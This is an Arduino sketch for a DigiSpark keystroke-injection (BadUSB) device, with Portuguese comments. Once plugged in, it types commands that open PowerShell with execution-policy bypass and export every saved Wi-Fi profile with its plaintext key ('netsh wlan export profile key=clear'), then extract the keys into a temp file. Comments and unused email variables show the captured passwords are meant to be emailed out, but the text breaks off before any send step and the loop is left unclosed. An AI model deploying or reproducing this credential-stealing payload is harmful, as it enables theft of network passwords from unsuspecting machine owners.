#include "DigiKeyboard.h"

void setup() {
}

// Edite o endereço de e-mail e a senha para enviar a senha Wi-Fi extraída
char modeCommand[] = "powershell -nop -exec bypass";
char separatorCommand[] = "read-host";
char emailAddressPrompt[] = "Digite o endereço de e-mail para eviar as informações extraidas da senha do Wi-Fi: ";
char emailAddress[100];
char passwordPrompt[] = "Digite a senha do endereço de email: ";
char password[100];

void loop() {
  // Abre uma Janela do PowerShell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println(modeCommand);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Extrair informações da senha Wi-Fi
  DigiKeyboard.println("cd $env:temp");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > temp.csv");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
